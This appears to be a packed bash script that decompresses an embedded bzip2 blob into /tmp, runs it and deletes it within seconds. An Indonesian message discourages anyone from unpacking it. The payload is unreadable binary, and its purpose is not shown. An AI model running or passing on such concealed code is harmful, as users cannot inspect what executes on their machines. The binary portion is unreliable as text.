#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��T1 S_�u������������PD@  `}�K���bH� � #Sɤ��O	�&�ę�������L��(�Ѡ ��hCM2��L���)Hy@�F�  �     ��I���Rmh `F ���h40#C@8h �A�0@4���2 b���L�R~)��&���i4dyO(h��3Q�.� )@B �:�/�f���f8���B����6{�49Yv���qw�R�b���*~�ɹ�u�f�ڲ���?��($?�ƒ���g����g^n�^B�S�Xأ�Βx$�K�3������-O$�@F}�9Oi6����Vӷ�A)򘚘"�:oDO� �	��{Ϩ����'f��r���t��#X��Udz2R݇�4P���ty�tF]!�r��Z�瘝�Q�`i<>$�
)�X��j@� �cX@o/�&.�a$[���Ã��������y��ԅ���z]�C!��s]%5(��;�`i(�H/���=4P{P�(��`"� 1-�f��3>��d�NYe�<D�LN|DJ{qӰ�S_x�bz�)dZ��p��'x�g�$�Ԓ�`�� =A�qq��4B��&�w8ߵ�uP�J�F�p04CbGN��k����-}�CD�=�|�� %|$+	�vc���R�����U�V�qK۽L�̦�=6��oL�h}!O�l�7��D cPs>�sH(�űU�(['>~Z�l��O5	(���㱉�J�i�.�;[fv����s��cVO�m�/�c��a��</c��U�D�u�����sfJ#�&�o��K
�jץ���3B%�£=��fԊqi�Iސm�B/��J8O$�,�����vm��T���sE�f�=:4ң%<�dH��?V�s�i�b1������"UM@#��j6�����9�21@�?G7M����X�G��1�0iw�7�����@�#�ĽD'i�	|��oc~��-�F��� ��$�2,�� ���آm���>L��h*,ԋ���s�'Aϼ���������m�� ?�MS�#���g)ŠK����UU�&�6R`����ʍZ||+1��!��������B�*f���� @쭺�̯�L� �=5Vn7��"���] Έ
}�����Ԃ���4w�����w���/\�$껀W<f�%�J��7��++k�l�A�Q-�/%X�_p����m��OV��A�t|��~.c��w�F� D���l�r���7������`{�����#���U�[`?G���_�c
r�A�>#�����;���D!8�%#o<
��-6�6��\�耈*  �J��zs�^�ڂ
�e�M��<2�]�4��~�6�k�_e�}�5��O��&d���s�3�E{A�#��pJd꧃������wK&$q`Q�S|��f�nЗ7�Uīwa�paX"�j�GЩ /���W�����������t��mO�����n��y�Z༲�%��V�/g+O��g�r/e��H���'��(T&�A��hYxu�h��m���r�fE��=��U� xլj@e����h�����F��Z(`^��Z�pV��)$�e��cD�lH: �%_�h;__W���=�@�Ą&����L� *�1����H�
�J� 